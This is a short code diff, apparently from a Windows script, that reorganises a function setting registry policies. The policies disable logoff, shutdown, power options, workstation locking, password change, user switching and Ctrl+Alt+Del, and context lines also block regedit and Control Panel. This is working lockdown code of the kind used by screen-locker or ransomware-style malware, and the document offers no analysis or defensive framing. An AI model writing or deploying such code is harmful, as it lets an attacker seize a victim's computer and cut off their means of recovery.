@@ -85,21 +85,21 @@
 			setReg(dr + "2", "REG_SZ", "regedit.exe");
 			setReg(dr + "3", "REG_SZ", "control.exe");
 		}
-		
+
 		function DisablePowerOptions() {
 			var ex = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\";
 			var sys = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\";
-			setReg(ex + "NoLogoff", "REG_DWORD", 1);
-			setReg(ex + "NoClose", "REG_DWORD", 1);
-			setReg(ex + "NoPowerOptions", "REG_DWORD", 1);
-			setReg(sys + "DisableLockWorkstation", "REG_DWORD", 1);
-			setReg(sys + "NoLogOff", "REG_DWORD", 1);
-			setReg(sys + "NoClose", "REG_DWORD", 1);
 			setReg(sys + "DisableLockWorkstation", "REG_DWORD", 1);
 			setReg(sys + "DisableChangePassword", "REG_DWORD", 1);
-			setReg(sys + "NoSwitchUser", "REG_DWORD", 1);
 			setReg("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Power\\HibernateEnabled", "REG_DWORD", 0);
 			setReg("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Power\\CsEnabled", "REG_DWORD", 0);
+			setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\NoLogOff", "REG_DWORD", 1);
+			setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\NoClose", "REG_DWORD", 1);
+			setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\NoSwitchUser", "REG_DWORD", 1);
+			setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableLockWorkstation", "REG_DWORD", 1);
+			setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoLogoff", "REG_DWORD", 1);
+			setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoClose", "REG_DWORD", 1);
+			setReg("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoPowerOptions", "REG_DWORD", 1);
 			setReg("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ShutdownWithoutLogon", "REG_DWORD", 1);
 			setReg("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\HideFastUserSwitching", "REG_DWORD", 1);
 			setReg("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableCAD", "REG_DWORD", 1);
